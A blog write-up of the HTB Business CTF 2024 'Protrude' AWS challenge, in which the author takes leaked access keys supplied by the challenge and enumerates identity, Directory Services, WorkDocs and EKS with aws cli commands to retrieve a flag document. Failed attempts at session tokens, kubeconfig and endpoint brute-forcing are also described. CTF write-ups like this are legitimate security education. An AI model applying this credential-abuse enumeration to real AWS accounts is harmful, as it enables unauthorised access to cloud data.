---
title: "HTB Business CTF 2024 - Protrude Challenge"
date: "2024-05-31"
tags: 
  - "aws"
  - "cloud"
  - "ctf"
  - "cybersecurity"
  - "hacking"
  - "htb"
  - "infosec"
  - "pentesting"
  - "redteam"
  - "security"
coverImage: "./images/Protrude_aws.png"
layout: post
---

# HTB Business CTF 2024 - The Vault of Hope

HACKTHEBOX puts up this fun yearly CTF in which you join your organizations team to solve challenges and compete against other companies’ security teams. I decided to join in on the fun with the Microsoft team and it was a very fun and collaborative time!

I enjoy Cloud shenanigans, and so that’s where I put my efforts. This is one of the challenges I solved and I thought it would be responsible of me to share my approach as I got good feedback from others folks about it and they found it insightful.

# Protrude Challenge (AWS based)

> \[!INFO\] Challenge We have obtained leaked account pertaining to Vault 101, with suspicion that it may be linked to one of the leaders group. Your task is to enumerate and see if we can infiltrate them internally.

#### The Creds were in a zip file containing a CSV:

##### Access Key ID

```Text
AKIAXYAFLIG2JE6MC2SY
```

##### Secret Access Key

```Text
teWVv0GzIBKS23uozxUGmUH+[...]
```

##### Region name

```Text
us-east-1
```

# Rabbit Hole 🐇To Flag 🏁 🏆

### What are these creds for?

Searched for “Access Key Secret access key” and found this:

- https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html
    - https://stackoverflow.com/questions/57550366/what-is-the-aws-access-key-id-aws-secret-access-key

### Installed `awscli` & Exported Credentials to environment variables

- Installed `awscli` , used for running commands with the given credentials
- The `awscli` will check for these environment variables and use them for Auth.

#### Some basic **whoami** type commands:

```Shell
aws sts get-caller-identity
```

```JSON
{
    "UserId": "AIDAXYAFLIG2E6UQ3YIVB",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/aalmodovar"
}
```

### Permission Enumeration/Checking

Check page for available permissions and tooling.

### Directory Services

Using one of the commands found above via Permission Enumeration, we could list some information about Directory services As part of the Directory Services, I found it had a URL:

```JSON
"AccessUrl": "vault101.awsapps.com"
```

#### Tool - aws cli:

Command for checking this:

```Shell
aws --profile default --region us-east-1 ds describe-directories
```

##### Output

```JSON
aws --profile default --region us-east-1 ds describe-directories
{
    "DirectoryDescriptions": [
        {
            "DirectoryId": "d-9067e0513b",
            "Name": "vault101.wasteland.local",
            "ShortName": "VAULT101",
            "Size": "Small",
            "Alias": "vault101",
            "AccessUrl": "vault101.awsapps.com",
            "DnsIpAddrs": [
                "172.31.87.164",
                "172.31.31.15"
            ],
            "Stage": "Active",
            "LaunchTime": 1714340834.63,
            "StageLastUpdatedDateTime": 1714341253.623,
            "Type": "SimpleAD",
            "VpcSettings": {
                "VpcId": "vpc-0d7b2c5c8509574bd",
                "SubnetIds": [
                    "subnet-0a5022ff1dfdf5518",
                    "subnet-0574f58cd2d4f85ca"
                ],
                "SecurityGroupId": "sg-0bee7f241cef79345",
                "AvailabilityZones": [
                    "us-east-1a",
                    "us-east-1d"
                ]
            },
            "SsoEnabled": true,
            "DesiredNumberOfDomainControllers": 0
        }
    ]
}
```

### vault101.awsapps.com

Visited the “AccessUrl”: “vault101.awsapps.com”.When you visit that endpoint, you are quickly redirected to log in to **WorkDocs**, which is part of the clue.

- I tried accessing the console, by attempting to exchange the **SessionToken** for a **`SigninToken`** using AWS Federation to Access Resources. However, we did not have the necessary permissions 😢

### WorkDocs… 🏁

Doing some WorkDocs recon, I found we had access to list the documents using the aws cli.

#### Tool - aws cli

```Shell
aws workdocs describe-activities --organization-id d-9067e0513b
```

```JSON
{
    "UserActivities": [
        {
            "Type": "DOCUMENT_VERSION_VIEWED",
            "TimeStamp": "2024-05-19T06:15:32.835000-07:00",
            "IsIndirectActivity": false,
            "Initiator": {
                "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
            },
            "ResourceMetadata": {
                "Type": "document",
                "Name": "flag.txt",
                "Id": "5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce799614ca32a8303",
                "Owner": {
                    "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
                }
            }
        }, ...
```

- Listing the documents showed a “flag.txt” file, well many really.

### Getting the flag 🏁!

I leveraged the Id of one of them to retrieve the information and a URL for that document:

```Shell
aws workdocs get-document --document-id 5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce79
```

The document had the 🏁 flag! 🏆

* * *

# Rabbit Holes 🐰 to distractions… 😢

Not everything was so straight forward and I went on a few rabbit holes to no where…

### Found a way to get an `SessionToken` as well (through the Permission Enumeration)

```Shell
aws --profile default --region us-east-1 sts get-session-token
aws sts get-session-token --duration-seconds 86400
```

### Found some EKS Credentials!

Through one of the permissions, it gives you the command to get an eks access token:

```Shell
aws eks get-token --profile default --region us-east-1 --cluster-name OrganizationAccountAccessRole
```

- However, we do not have the URL for the Kubernetes Cluster API Endpoint
- Attempted crafting the URL manually with no luck
- I also tried running the command to get a `kubeconfig` file, but we do not have permissions for that either:

```Shell
aws eks update-kubeconfig --region us-east-1 --name OrganizationAccountAccessRole
```

- ❌ Failed - No permissions

#### Some more recon and enum attempts

```Shell
aws eks list-associated-access-policies --cluster-name OrganizationAccountAccessRole --principal-arn AIDAXYAFLIG2E6UQ3YIVB
```

```Shell
An error occurred (AccessDeniedException) when calling the ListAssociatedAccessPolicies operation: User: arn:aws:iam::532587168180:user/aalmodovar is not authorized to perform: eks:ListAssociatedAccessPolicies on resource: arn:aws:eks:us-east-1:532587168180:access-entry/OrganizationAccountAccessRole////*
```

```Shell
aws eks describe-access-entry --cluster-name OrganizationAccountAccessRole --principal-arn AIDAXYAFLIG2E6UQ3YIVB
```

```Shell
An error occurred (AccessDeniedException) when calling the DescribeAccessEntry operation: User: arn:aws:iam::532587168180:user/aalmodovar is not authorized to perform: eks:DescribeAccessEntry on resource: arn:aws:eks:us-east-1:532587168180:access-entry/OrganizationAccountAccessRole////*
```

```Shell
cluster_endpoint=$(aws eks describe-cluster \
--region us-east-1 \
--name OrganizationAccountAccessRole \
--query "cluster.endpoint" \
--output text)
```

```Shell
aws eks describe-cluster --region us-east-1 --name OrganizationAccountAccessRole --query "cluster.endpoint" --output text
```

#### Summary of attempts:

- We tried to list the clusters - ❌ No Permissions
- Tried to get a `kubeconfig` file - ❌ No Permissions
- Tried brute-forcing the URL using the known cluster names and common aws eks API endpoint URL schemes - ❌ Not successful
- Attempted to use a SessionToken with their REST API to get the cluster ❌ Not successful
- Attempted with SessionToken to list clusters ❌ Not successful

* * *

# Visual of the Attack Path:

This is a visual representation of some of the activities involved with trying to obtain the flag and following the green arrows is the “happy” path to the flag.

![](images/Protrude_aws-1024x944.png)
![Protrude Attack Path]({{ page.url }}images/Protrude_aws-1024x944.png) 

<img src="images/Protrude_aws-1024x944.png" alt="GIAC Certified Incident Handler (GCIH)">
